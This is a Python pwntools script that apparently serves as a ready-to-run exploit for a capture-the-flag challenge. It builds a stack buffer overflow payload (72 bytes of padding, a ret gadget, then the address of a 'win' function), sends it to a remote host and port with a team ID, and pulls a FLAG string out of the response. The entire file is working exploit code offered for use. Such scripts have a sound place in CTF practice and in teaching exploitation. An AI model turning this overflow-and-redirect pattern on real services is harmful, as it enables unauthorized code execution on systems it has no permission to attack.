#!/usr/bin/env python3

import os
import re
import sys
import time

from pwn import ELF, context, p64, remote

context.log_level = "error"

ELF_PATH = "/opt/chall"
OFFSET = 72
FLAG_RE = re.compile(rb"FLAG\{[^\n\r}]*\}")


def _env(name: str) -> str:
    value = os.environ.get(name)
    if not value:
        raise RuntimeError(f"missing env {name}")
    return value


def _target_from_args_or_env() -> tuple[str, int, bytes]:
    if len(sys.argv) == 4:
        host = sys.argv[1]
        port = int(sys.argv[2])
        team_id = sys.argv[3].encode()
        return host, port, team_id

    host = _env("TARGET_HOST")
    port = int(_env("TARGET_PORT"))
    team_id = _env("TARGET_TEAM_ID").encode()
    return host, port, team_id


def main() -> int:
    try:
        host, port, team_id = _target_from_args_or_env()
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        print(
            f"Usage: {sys.argv[0]} <TARGET_HOST> <TARGET_PORT> <TARGET_TEAM_ID>",
            file=sys.stderr,
        )
        return 2

    elf = ELF(ELF_PATH, checksec=False)
    context.binary = elf

    win = elf.symbols.get("win")
    if win is None:
        print("[!] missing win symbol", file=sys.stderr)
        return 2
    ret = next(elf.search(b"\xc3"))

    payload = b"A" * OFFSET + p64(ret) + p64(win)

    transcript = b""
    io = remote(host, port, timeout=5)
    try:
        transcript += io.recvuntil(b"TEAM ID?", timeout=5)
        io.sendline(team_id)
        transcript += io.recvuntil(b"Send your payload:", timeout=5)
        io.send(payload)
        transcript += io.recvall(timeout=5)
    finally:
        try:
            io.close()
        except Exception:
            pass

    m = FLAG_RE.search(transcript)
    if m:
        time.sleep(30)
        sys.stdout.buffer.write(m.group(0) + b"\n")
        sys.stdout.buffer.flush()
        time.sleep(30)
        return 0

    sys.stdout.buffer.write(transcript)
    if not transcript.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    sys.stdout.buffer.flush()
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
